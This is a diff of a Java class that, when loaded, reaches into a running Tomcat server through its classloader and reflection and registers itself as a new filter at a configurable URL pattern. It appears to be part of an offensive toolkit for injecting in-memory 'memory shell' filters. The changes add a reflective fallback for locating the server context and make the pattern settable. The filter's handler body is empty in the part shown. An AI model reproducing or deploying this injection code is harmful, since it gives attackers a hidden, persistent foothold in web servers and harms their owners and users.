@@ -19,14 +19,28 @@ import java.util.Map;
  */
 public class TFMSFromThreadF implements Filter {
 
+    public static String pattern;
+
     static {
         try {
-            final String name       = "nu1r" + System.nanoTime();
-            final String URLPattern = "/nu1r";
+            final String name = String.valueOf(System.nanoTime());
 
             WebappClassLoaderBase webappClassLoaderBase =
                     (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+
+            StandardContext standardContext;
+
+            try {
+                standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
+            } catch (Exception ignored) {
+                Field field = webappClassLoaderBase.getClass().getSuperclass().getDeclaredField("resources");
+                field.setAccessible(true);
+                Object root   = field.get(webappClassLoaderBase);
+                Field  field2 = root.getClass().getDeclaredField("context");
+                field2.setAccessible(true);
+
+                standardContext = (StandardContext) field2.get(root);
+            }
 
             Class<? extends StandardContext> aClass = null;
             try {
@@ -50,7 +64,7 @@ public class TFMSFromThreadF implements Filter {
             standardContext.addFilterDef(filterDef);
 
             FilterMap filterMap = new FilterMap();
-            filterMap.addURLPattern(URLPattern);
+            filterMap.addURLPattern(pattern);
             filterMap.setFilterName(name);
             filterMap.setDispatcher(DispatcherType.REQUEST.name());
 
@@ -71,7 +85,6 @@ public class TFMSFromThreadF implements Filter {
 
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
-
     }
 
     @Override
